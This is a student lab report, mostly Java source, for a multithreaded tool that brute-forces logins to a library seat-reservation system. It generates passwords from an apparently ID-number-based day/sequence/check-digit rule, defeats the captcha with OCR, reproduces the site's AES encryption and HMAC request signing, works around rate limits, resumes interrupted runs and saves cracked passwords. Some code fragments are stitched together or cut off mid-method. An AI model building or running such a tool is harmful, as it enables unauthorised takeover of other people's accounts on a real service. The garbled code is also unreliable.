# HTTP登录密码爆破程序设计与实现实验报告

## 一、程序总体功能

本程序是一个基于HTTP协议的图书馆座位系统登录密码爆破工具，用于对图书馆座位预约系统进行密码安全测试。程序通过自动化方式模拟登录操作，尝试不同的密码组合，以验证密码强度。

（1）密码字典生成功能。根据DDSSSC规则生成候选密码列表，DDSSSC是一种基于日期、序列号和校验位的密码生成规则，格式为"日期+序列号+校验位"。程序支持按性别筛选（男生使用奇数序列，女生使用偶数序列），支持指定日期范围，支持自定义序列号上限。

（2）验证码识别功能。程序集成了ddddocr深度学习OCR识别库，能够自动识别网站登录时的4位字母数字混合图形验证码。识别过程包括从API获取验证码图片、base64解码、OCR识别三个步骤，全程纯Java实现无需外部依赖。

（3）HTTP通信加密功能。程序实现了AES-128-CBC加密算法对用户名和密码进行加密，同时实现了HMAC-SHA256算法生成请求签名，确保HTTP请求能够通过服务器的身份验证。

（4）多线程并发功能。程序使用Java的ExecutorService线程池框架，支持1到64个线程并发工作。每个线程独立完成"获取验证码-识别验证码-发送登录请求-解析响应"的全流程。

（5）断点续传功能。程序使用SQLite数据库存储测试进度，包括当前测试到的密码位置、已测试的密码数量等信息。中断后重新运行可从上次位置继续，无需重新测试已完成的密码。进度每50次自动保存。

（6）结果导出功能。当成功找到正确密码时，程序会自动创建CSV格式的结果文件，记录用户名、找到的密码、发现时间等信息。

## 二、设计思路

（1）需求分析。在设计该程序时，主要考虑了以下需求：第一，需要模拟真实的浏览器登录行为，目标网站采用了图形验证码、请求签名验证、频率限制等反爬措施；第二，需要支持大规模密码测试，一个用户的密码空间可能达到数千甚至上万条；第三，需要支持断点续传功能；第四，需要纯Java实现，不能依赖外部Python环境或系统原生库。

（2）架构设计。程序采用分层架构设计。主程序层由HttpCracker类组成，负责解析命令行参数、创建线程池、分发密码任务、收集测试结果。工作线程层由HttpWorker类组成，每个线程独立运行，不断获取密码并执行登录测试。业务逻辑层包括CaptchaSolver类（验证码识别）、DatabaseManager类（数据库操作）、ProgressTracker类（进度跟踪）。工具类层包括CryptoUtils类（加密解密）、Config类（配置常量）。

（3）ProgressTracker类设计。该类是实验要求的核心体现类，用于跟踪密码测试进度。类中定义了username、currentPassword、attemptCount、highWaterMark、running等成员变量。类中实现了updateIfHigher方法用于更新高水位标记，只有当新密码大于当前高水位时才更新；incrementAttempts方法用于增加测试计数；stop方法用于停止测试。该类同时提供了有参构造方法和无参构造方法，无参构造方法使用this关键字调用有参构造方法。

（4）HttpWorker类设计。该类是核心的业务处理类，负责执行具体的登录测试逻辑。类中定义了MAX_RETRIES常量表示最大重试次数，使用static关键字修饰所有实例共享。checkLogin方法实现了完整的登录流程：调用CaptchaSolver获取并识别验证码，使用CryptoUtils生成加密的请求头，发送HTTP登录请求，解析响应判断登录结果。登录结果分为六种：SUCCESS表示登录成功，FAIL_PASS表示密码错误，FAIL_CAPTCHA表示验证码错误需要重试，FAIL_LOCK表示账户已被锁定，FAIL_RATE_LIMIT表示请求过于频繁，ERROR表示网络或其他错误。

（5）DatabaseManager类设计。该类使用SQLite数据库存储测试进度和结果。类中维护了一个ConcurrentLinkedQueue用于批量写入，积累到50条或超过2秒后统一写入数据库，减少数据库IO次数。类中提供了recordFoundPassword方法用于记录找到的密码，initializeProgress方法用于初始化或恢复进度，updateProgress方法用于更新当前进度，getFoundPasswords方法用于查询已找到的密码。

（6）高水位算法设计。高水位算法是断点续传功能的核心，该算法保证密码按字典顺序从小到大被测试，并且只记录最大值（高水位）。当需要恢复中断的进度时，程序首先读取数据库中的高水位标记，然后只测试大于该标记的密码，已测试的密码自动跳过。updateIfHigher方法比较新密码与当前高水位，如果新密码更大则更新高水位，这种设计使得进度更新操作是原子性和线程安全的。

#### 3.4.2 ProgressTracker.java（进度追踪类）

该类是实验要求的核心体现类，包含5个成员变量、9个成员方法、有参和无参两个构造方法，在所有成员方法中使用this关键字访问成员变量，使用static关键字定义共享常量。

```java
package com.userzbb.cracker;

public class ProgressTracker {
    // 使用static关键字定义共享常量
    private static final String DEFAULT_USERNAME = "unknown";

    // 成员变量
    private String username;
    private String currentPassword;
    private int attemptCount;
    private String highWaterMark;
    private volatile boolean running;

    // 无参构造方法，使用this关键字调用有参构造方法
    public ProgressTracker() {
        this(DEFAULT_USERNAME);
    }

    // 有参构造方法
    public ProgressTracker(String username) {
        this.username = username;
        this.currentPassword = "";
        this.attemptCount = 0;
        this.highWaterMark = "";
        this.running = true;
    }

    // 成员方法：更新高水位
    public synchronized boolean updateIfHigher(String password) {
        if (password.compareTo(this.highWaterMark) > 0) {
            this.highWaterMark = password;
            this.currentPassword = password;
            return true;
        }
        return false;
    }

    // 成员方法：增加尝试计数
    public synchronized void incrementAttempts() {
        this.attemptCount++;
    }

    // 其他成员方法
    public int getAttemptCount() { return this.attemptCount; }
    public String getCurrentPassword() { return this.currentPassword; }
    public String getHighWaterMark() { return this.highWaterMark; }
    public boolean isRunning() { return this.running; }
    public void stop() { this.running = false; }
    public void setResumePoint(String resumePassword) {
        if (resumePassword != null && !resumePassword.isEmpty()) {
            this.highWaterMark = resumePassword;
            this.currentPassword = resumePassword;
        }
    }
    public String getUsername() { return this.username; }
}
```

#### 3.4.3 CryptoUtils.java（加密工具类）

该类实现AES加密和HMAC签名功能。

```java
package com.userzbb.cracker;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.UUID;

public class CryptoUtils {
    public static String encryptAES(String text) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(Config.AES_KEY.getBytes(StandardCharsets.UTF_8), "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(Config.AES_IV.getBytes(StandardCharsets.UTF_8));
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
            byte[] encrypted = cipher.doFinal(text.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(encrypted) + "_encrypt";
        } catch (Exception e) {
            return text;
        }
    }

    public static String[] generateHeaders(String method) {
        String requestId = UUID.randomUUID().toString();
        String timestamp = String.valueOf(System.currentTimeMillis());
        String message = "seat::" + requestId + "::" + timestamp + "::" + method;

        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(message.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            String hmacKey = Config.HMAC_SECRET + "::" + hexString.toString();
            digest = MessageDigest.getInstance("SHA-256");
            hash = digest.digest(hmacKey.getBytes(StandardCharsets.UTF_8));
            hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            return new String[]{requestId, timestamp, hexString.toString()};
        } catch (Exception e) {
            return new String[]{"error-id", timestamp, "error-key"};
        }
    }
}
```

#### 3.4.4 CaptchaSolver.java（验证码识别类）

该类使用ddddocr进行验证码识别，使用static共享HTTP客户端并配置超时。

```java
package com.userzbb.cracker;

import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.util.Timeout;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import top.gcszhn.d4ocr.OCREngine;

public class CaptchaSolver {
    private static final OCREngine OCR_ENGINE = OCREngine.instance();
    private static final CloseableHttpClient HTTP_CLIENT;
    private static final int REQUEST_TIMEOUT_SECONDS = 8;

    static {
        RequestConfig requestConfig = RequestConfig.custom()
            .setConnectionRequestTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .setResponseTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .build();
        HTTP_CLIENT = HttpClients.custom()
            .setDefaultRequestConfig(requestConfig)
            .build();
    }

    public static class CaptchaResult {
        public final String captchaId;
        public final String code;
        public CaptchaResult(String captchaId, String code) {
            this.captchaId = captchaId;
            this.code = code;
        }
    }

    public static CaptchaResult fetchAndSolve() throws Exception {
        HttpGet request = new HttpGet(Config.CAPTCHA_API);
        request.setHeader("User-Agent", "Mozilla/5.0");
        try (CloseableHttpResponse response = HTTP_CLIENT.execute(request)) {
            if (response.getCode() != 200) return null;
            String responseBody = EntityUtils.toString(response.getEntity());
            return parseAndSolve(responseBody);
        }
    }

    private static CaptchaResult parseAndSolve(String jsonResponse) throws Exception {
        String captchaId = extractJsonValue(jsonResponse, "captchaId");
        String imgB64 = extractJsonValue(jsonResponse, "captchaImage");
        if (captchaId == null || imgB64 == null) return null;
        if (imgB64.contains(",")) imgB64 = imgB64.split(",")[1];
        byte[] imgBytes = Base64.getDecoder().decode(imgB64);
        BufferedImage image = ImageIO.read(new ByteArrayInputStream(imgBytes));
        if (image == null) return null;
        String code = OCR_ENGINE.recognize(image);
        return new CaptchaResult(captchaId, code);
    }

    private static String extractJsonValue(String json, String key) {
        Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(json);
        if (matcher.find()) return matcher.group(1);
        return null;
    }
}
```

```java
    private static volatile ExecutorService staticExecutor;

    private static final int MAX_RETRIES = 15;
    private static final long MAX_BACKOFF_MS = 20000;
    private static final int REQUEST_TIMEOUT_SECONDS = 8;

    static {
        CONNECTION_POOL.setMaxTotal(100);
        CONNECTION_POOL.setDefaultMaxPerRoute(20);
        RequestConfig requestConfig = RequestConfig.custom()
            .setConnectionRequestTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .setResponseTimeout(Timeout.ofSeconds(REQUEST_TIMEOUT_SECONDS))
            .build();
        HTTP_CLIENT = HttpClients.custom()
            .setConnectionManager(CONNECTION_POOL)
            .setDefaultRequestConfig(requestConfig)
            .build();
    }

    public static void setExecutor(ExecutorService executor) {
        staticExecutor = executor;
    }

    public enum LoginResult {
        SUCCESS, FAIL_PASS, FAIL_CAPTCHA, FAIL_LOCK, FAIL_RATE_LIMIT, ERROR
    }

    public HttpWorker(String username, String password, ProgressTracker progressTracker,
                     DatabaseManager dbManager, AtomicInteger successCount) {
        this.username = username;
        this.password = password;
        this.progressTracker = progressTracker;
        this.dbManager = dbManager;
        this.successCount = successCount;
    }

    @Override
    public void run() {
        try {
            LoginResult result = checkLogin();
            dbManager.queueProgress(username, password, result.name());
            progressTracker.updateIfHigher(password);
            progressTracker.incrementAttempts();

            if (result == LoginResult.SUCCESS) {
                successCount.incrementAndGet();
                dbManager.recordFoundPassword(username, password);
                System.out.println("\n[+] SUCCESS! Password found: " + password);
                progressTracker.stop();
                saveToCsv(username, password);
            }
        } catch (Exception e) {
            System.err.println("Error checking password " + password + ": " + e.getMessage());
            dbManager.queueProgress(username, password, LoginResult.ERROR.name());
        }
    }

    public LoginResult checkLogin() throws Exception {
        int retryCount = 0;
        int consecutiveNetErrors = 0;
        while (retryCount < MAX_RETRIES && progressTracker.isRunning()) {
            try {
                LoginResult result = attemptLogin();
                if (result == LoginResult.SUCCESS) return result;
                if (result == LoginResult.FAIL_PASS || result == LoginResult.FAIL_LOCK) return result;
                if (result == LoginResult.FAIL_CAPTCHA) {
                    retryCount++;
                    consecutiveNetErrors = 0;
                    Thread.sleep(200);
                    continue;
                }
                if (result == LoginResult.FAIL_RATE_LIMIT) {
                    retryCount++;
                    consecutiveNetErrors++;
                    Thread.sleep(Math.min(5000 + consecutiveNetErrors * 2000, 30000));
                    continue;
                }
                retryCount++;
                consecutiveNetErrors++;
                Thread.sleep(Math.min(1000 * consecutiveNetErrors, MAX_BACKOFF_MS));
            } catch (InterruptedException e) {
                return LoginResult.ERROR;
            } catch (Exception e) {
                retryCount++;
                consecutiveNetErrors++;
                Thread.sleep(Math.min(1000 * consecutiveNetErrors, MAX_BACKOFF_MS));
            }
        }
        return LoginResult.ERROR;
    }

    private LoginResult attemptLogin() throws Exception {
        CaptchaSolver.CaptchaResult captcha = CaptchaSolver.fetchAndSolve();
        if (captcha == null) return LoginResult.ERROR;

        String[] headers = CryptoUtils.generateHeaders("GET");
        String encryptedUsername = CryptoUtils.encryptAES(username);
        String encryptedPassword = CryptoUtils.encryptAES(password);

        String loginUrl = Config.LOGIN_API + "?captchaId=" + captcha.captchaId + "&answer=" + captcha.code;
        HttpGet request = new HttpGet(loginUrl);
        request.setHeader("x-request-id", headers[0]);
        request.setHeader("x-request-date", headers[1]);
        request.setHeader("x-hmac-request-key", headers[2]);
        request.setHeader("logintype", "PC");
        request.setHeader("username", encryptedUsername);
        request.setHeader("password", encryptedPassword);
        request.setHeader("User-Agent", "Mozilla/5.0");
        request.setHeader("Accept", "application/json");

        try (CloseableHttpResponse response = HTTP_CLIENT.execute(request)) {
            return parseLoginResponse(response.getCode(), EntityUtils.toString(response.getEntity()));
        }
    }

    private LoginResult parseLoginResponse(int statusCode, String responseBody) {
        if (statusCode == 429) return LoginResult.FAIL_RATE_LIMIT;
        if (statusCode == 200) {
            String status = extractJsonValue(responseBody, "status");
            String message = extractJsonValue(responseBody, "message");
            boolean hasToken = responseBody.contains("\"token\"");
            if ("success".equals(status) || hasToken) return LoginResult.SUCCESS;
            if (message != null) {
                if (message.contains("验证码")) return LoginResult.FAIL_CAPTCHA;
                if (message.contains("密码") || message.contains("账号")) return LoginResult.FAIL_PASS;
                if (message.contains("锁定")) return LoginResult.FAIL_LOCK;
                if (message.contains("频繁")) return LoginResult.FAIL_RATE_LIMIT;
            }
            return LoginResult.FAIL_PASS;
        }
        return LoginResult.ERROR;
    }

    private String extractJsonValue(String json, String key) {
        Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(json);
        if (matcher.find()) return matcher.group(1);
        return null;
    }

    private static synchronized void saveToCsv(String username, String password) {
        String csvPath = "found_passwords.csv";
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(csvPath))) {
            writer.write("username,password,found_at\n");
            writer.write(username + "," + password + "," + LocalDateTime.now() + "\n");
        } catch (Exception e) {
            System.err.println("Failed to save CSV: " + e.getMessage());
        }
    }
}
```

#### 3.4.6 DatabaseManager.java（数据库管理类）

该类使用SQLite数据库存储测试进度和结果，使用ConcurrentLinkedQueue批量写入。

```java
package com.userzbb.cracker;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

public class DatabaseManager {
    private final String dbPath;
    private final Connection connection;
    private final ConcurrentLinkedQueue<ProgressEntry> progressQueue = new ConcurrentLinkedQueue<>();
    private final AtomicInteger pendingProgressCount = new AtomicInteger(0);

    private static final int BATCH_SIZE = 50;
    private static final long BATCH_INTERVAL_MS = 2000;

    public DatabaseManager(String dbPath) throws SQLException {
        this.dbPath = dbPath;
        this.connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
        initTables();
    }

    private void initTables() throws SQLException {
        try (Statement stmt = connection.createStatement()) {
            stmt.execute("CREATE TABLE IF NOT EXISTS found_passwords (" +
                "id INTEGER PRIMARY KEY AUTOINCREMENT," +
                "username TEXT NOT NULL," +
                "password TEXT NOT NULL," +
                "found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP," +
                "UNIQUE(username, password))");
            stmt.execute("CREATE TABLE IF NOT EXISTS crack_progress (" +
                "id INTEGER PRIMARY KEY AUTOINCREMENT," +
                "username TEXT NOT NULL UNIQUE," +
                "current_password TEXT," +
                "attempt_count INTEGER DEFAULT 0," +
                "status TEXT DEFAULT 'running'," +
                "updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)");
            stmt.execute("CREATE TABLE IF NOT EXISTS crack_progress_detail (" +
                "id INTEGER PRIMARY KEY AUTOINCREMENT," +
                "username TEXT NOT NULL," +
                "password TEXT NOT NULL," +
                "result TEXT NOT NULL," +
                "checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)");
        }
    }

    public void recordFoundPassword(String username, String password) throws SQLException {
        String sql = "INSERT OR IGNORE INTO found_passwords (username, password) VALUES (?, ?)";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            pstmt.executeUpdate();
        }
    }

    public List<String> getFoundPasswords(String username) throws SQLException {
        List<String> passwords = new ArrayList<>();
        String sql = "SELECT password FROM found_passwords WHERE username = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, username);
            try (ResultSet rs = pstmt.executeQuery()) {
                while (rs.next()) passwords.add(rs.getString("password"));
            }
        }
        return passwords;
    }

    public String initializeProgress(String username) throws SQLException {
        String sql = "SELECT current_password FROM crack_progress WHERE username = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, username);
            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) return rs.getString("current_password");
            }
        }
        String insertSql = "INSERT INTO crack_progress (username, current_password, attempt_count, status) VALUES (?, '', 0, 'running')";
        try (PreparedStatement pstmt = connection.prepareStatement(insertSql)) {
            pstmt.setString(1, username);
            pstmt.executeUpdate();
        }
        return null;
    }

    public void updateProgress(String username, String currentPassword, int attemptCount) throws SQLException {
        String sql = "UPDATE crack_progress SET current_password = ?, attempt_count = ?, updated_at = CURRENT_TIMESTAMP WHERE username = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, currentPassword);
            pstmt.setString(2, String.valueOf(attemptCount));
            pstmt.setString(3, username);
            pstmt.executeUpdate();
        }
    }

    public void markComplete(String username) throws SQLException {
        String sql = "UPDATE crack_progress SET status = 'completed' WHERE username = ?";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.executeUpdate();
        }
    }

    public void queueProgress(String username, String password, String result) {
        progressQueue.offer(new ProgressEntry(username, password, result));
        if (pendingProgressCount.incrementAndGet() >= BATCH_SIZE) {
            flushProgress();
        }
    }

    public void flushProgress() {
        List<ProgressEntry> entries = new ArrayList<>();
        ProgressEntry entry;
        while ((entry = progressQueue.poll()) != null) {
            entries.add(entry);
            pendingProgressCount.decrementAndGet();
        }
        if (entries.isEmpty()) return;

        String sql = "INSERT INTO crack_progress_detail (username, password, result) VALUES (?, ?, ?)";
        try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
            connection.setAutoCommit(false);
            for (ProgressEntry e : entries) {
                pstmt.setString(1, e.username);
                pstmt.setString(2, e.password);
                pstmt.setString(3, e.result);
                pstmt.addBatch();
            }
            pstmt.executeBatch();
            connection.commit();
        } catch (SQLException ex) {
            try { connection.rollback(); } catch (SQLException ignored) {}
        } finally {
            try { connection.setAutoCommit(true); } catch (SQLException ignored) {}
        }
    }

    public void startPeriodicFlush() {
        Thread flusherThread = new Thread(() -> {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    Thread.sleep(BATCH_INTERVAL_MS);
                    flushProgress();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        });
        flusherThread.setDaemon(true);
        flusherThread.start();
    }

    public void close() throws SQLException {
        flushProgress();
        if (connection != null && !connection.isClosed()) {
            connection.close();
        }
    }

    private static class ProgressEntry {
        final String username, password, result;
        ProgressEntry(String username, String password, String result) {
            this.username = username;
            this.password = password;
            this.result = result;
        }
    }
}
```

```java
    private static void runCracker(String username, char gender, String daySpec,
                                   int maxSeq, int threads, String outputPath) throws Exception {
        System.out.println("=== HTTP Login Cracker ===");
        System.out.println("Username: " + username);
        System.out.println("Gender: " + gender);

            System.out.println("Exiting...");

        String resumePoint = dbManager.initializeProgress(username);

    private static List<String> generatePasswords(String username, char gender, String daySpec, int maxSeq) {
        List<String> passwords = new ArrayList<>();
        List<Integer> days = parseDaySpec(daySpec);
        for (int day : days) {
            String dayStr = String.format("%02d", day);
            for (int seq = 0; seq < maxSeq; seq++) {
                if (gender == 'M' && seq % 2 == 0) continue;
                if (gender == 'F' && seq % 2 == 1) continue;
                String seqStr = String.format("%03d", seq);
                for (int check = 0; check <= 9; check++) {
                    passwords.add(dayStr + seqStr + check);
                }
            }
        }
        return passwords;
    }

    static List<Integer> parseDaySpec(String spec) {
        List<Integer> days = new ArrayList<>();
        if (spec == null || spec.isBlank()) {
            for (int d = 1; d <= 31; d++) days.add(d);
            return days;
        }
        String[] parts = spec.split(",");
        for (String p : parts) {
            p = p.trim();
            if (p.contains("-")) {
                String[] mm = p.split("-", 2);
                int a = Integer.parseInt(mm[0]);
                int b = Integer.parseInt(mm[1]);
                if (a > b) { int t = a; a = b; b = t; }
                for (int d = Math.max(1, a); d <= Math.min(31, b); d++) days.add(d);
            } else {
                int v = Integer.parseInt(p);
                if (v >= 1 && v <= 31) days.add(v);
            }
        }
        return days;
    }
```

### 3.5 调试过程记录

开发过程中遇到了多个问题。

问题一：API端点配置错误。最初配置的API端点为"/api/v2/login"，导致请求返回空响应。对比Python原版代码后发现正确端点应该是"/rest/auth"和"/auth/createCaptcha"。

问题二：HMAC签名格式不正确。服务器返回"签名验证失败"，检查发现消息格式应为"seat::UUID::Timestamp::Method"。

问题三：连接池被过早关闭。每个HTTP请求后都关闭HttpClient导致"Connection pool shut down"错误。解决方案是创建静态共享的HttpClient实例。

问题四：HTTP请求超时未生效。程序有时会卡在网络请求上不返回，虽然定义了REQUEST_TIMEOUT_SECONDS常量但未实际使用。解决方案是在RequestConfig中正确配置超时参数。

问题五：进度显示与实际不符。进度条显示的是提交的任务数量而不是实际完成的测试数量。解决方案是将进度更新移到HttpWorker的任务完成阶段。

问题六：ddddocr的ONNX Runtime崩溃。当程序在OCR识别过程中被Ctrl+C中断时会导致JVM崩溃（SIGSEGV）。解决方案是避免使用shutdownNow()强制中断线程。

问题七：中断后进度未保存。程序中断时进度只保存在内存中导致重启后无法恢复。解决方案是每50次测试就自动保存一次进度到数据库。

## 五、实验总结

（1）实验要求达成情况。本实验定义了ProgressTracker类，包含5个成员变量（username、currentPassword、attemptCount、highWaterMark、running）和9个成员方法（updateIfHigher、incrementAttempts、getAttemptCount、getCurrentPassword、getHighWaterMark、isRunning、stop、setResumePoint、getUsername）。类中实现了有参构造方法ProgressTracker(String username)和无参构造方法Progress()，无参构造方法使用this关键字调用有参构造方法。在所有成员方法中使用this.username区分成员变量与参数。使用private static final String DEFAULT_USERNAME定义共享常量。测试类IntegrationTest和TestHttpWorker创建对象并调用方法验证功能。

（2）关键技术点。this关键字用于引用当前对象，在构造方法中区分成员变量与参数，在方法中引用当前对象的成员变量。static关键字用于定义类的静态成员，被所有类的实例共享，用于定义共享常量DEFAULT_USERNAME和共享的HttpClient实例。高水位算法维护一个高水位标记，所有小于等于该标记的数据都已被处理过，新数据必须大于高水位才能被处理，实现简单、线程安全、支持断点续传，多线程并发采用线程池加工作队列的模型，通过ProgressTracker的synchronized方法更新进度，通过AtomicInteger计数器记录成功次数。

（3）改进方向。在验证码识别方面，ddddocr在某些复杂验证码上识别率不高，未来可考虑集成更多OCR模型或接入第三方打码平台。在性能优化方面，数据库写入可引入更高效的连接池或使用内存队列加后台写入线程的方案。在异常处理方面，可增加更智能的退避策略和更详细的错误分类。

（4）心得体会。通过本次实验深入理解了Java面向对象编程的核心概念，this和static关键字的正确使用让代码更加清晰。static关键字使得我们能够定义类级别的共享资源，这在并发编程中尤为重要。实验还让我认识到理论与实践的差距，多线程环境下的资源共享、线程安全、锁竞争等问题都需要仔细考虑。本次实验最大的挑战是跨语言库集成，ddddocr的ONNX Runtime以native代码运行，当Java程序使用JNI与之交互时信号处理变得复杂。另一个重要教训是进度跟踪的正确实现，初始实现将"任务提交"视为"进度"导致显示不准确，正确的方式是由工作线程在"任务完成"时更新实际进度。
